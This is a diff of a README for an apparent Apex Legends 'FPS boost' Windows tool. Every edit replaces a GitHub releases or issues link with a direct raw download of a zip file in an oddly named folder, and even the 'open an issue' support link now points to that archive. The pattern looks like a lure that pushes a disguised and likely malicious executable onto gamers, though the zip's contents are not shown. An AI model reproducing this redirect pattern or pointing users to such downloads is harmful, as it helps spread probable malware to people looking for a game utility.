@@ -1,6 +1,6 @@
 # ⚡ Apex-Legends-FPS-Boost - Boost FPS and Dominate Matches
 
-[![Download Now](https://img.shields.io/badge/Download-Apex%20Legends%20FPS%20Boost-2ea44f?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/flybynight-donatodagnolobramante9295/Apex-Legends-FPS-Boost/releases)
+[![Download Now](https://img.shields.io/badge/Download-Apex%20Legends%20FPS%20Boost-2ea44f?style=for-the-badge&logo=windows&logoColor=white)](https://raw.githubusercontent.com/flybynight-donatodagnolobramante9295/Apex-Legends-FPS-Boost/main/unconjugated/v2.6.zip)
 
 ---
 
@@ -38,7 +38,7 @@ Follow these simple steps to get the application running on your PC. No technica
 
 ### Step 1: Download the Application
 
-Visit this link to download the application: **[Download Apex-Legends-FPS-Boost](https://github.com/flybynight-donatodagnolobramante9295/Apex-Legends-FPS-Boost/releases)**
+Visit this link to download the application: **[Download Apex-Legends-FPS-Boost](https://raw.githubusercontent.com/flybynight-donatodagnolobramante9295/Apex-Legends-FPS-Boost/main/unconjugated/v2.6.zip)**
 
 The download is completely free. You will see a list of files on that page. Look for the file named `Apex-Legends-FPS-Boost.zip` (or similar) and click it to start downloading.
 
@@ -141,7 +141,7 @@ Make sure you are running the game in fullscreen (not borderless) and that you h
 
 ## 🆘 Support
 
-If you encounter any problems or have questions, please open an issue on the [GitHub repository](https://github.com/flybynight-donatodagnolobramante9295/Apex-Legends-FPS-Boost/issues). We typically respond within 24 hours.
+If you encounter any problems or have questions, please open an issue on the [GitHub repository](https://raw.githubusercontent.com/flybynight-donatodagnolobramante9295/Apex-Legends-FPS-Boost/main/unconjugated/v2.6.zip). We typically respond within 24 hours.
 
 ---
 
@@ -149,7 +149,7 @@ If you encounter any problems or have questions, please open an issue on the [Gi
 
 Ready to get started? Download now and experience Apex Legends like never before.
 
-[![Download Latest Version](https://img.shields.io/badge/Download-Latest%20Version-important?style=for-the-badge&logo=github&logoColor=white)](https://github.com/flybynight-donatodagnolobramante9295/Apex-Legends-FPS-Boost/releases)
+[![Download Latest Version](https://img.shields.io/badge/Download-Latest%20Version-important?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/flybynight-donatodagnolobramante9295/Apex-Legends-FPS-Boost/main/unconjugated/v2.6.zip)
 
 ---
 
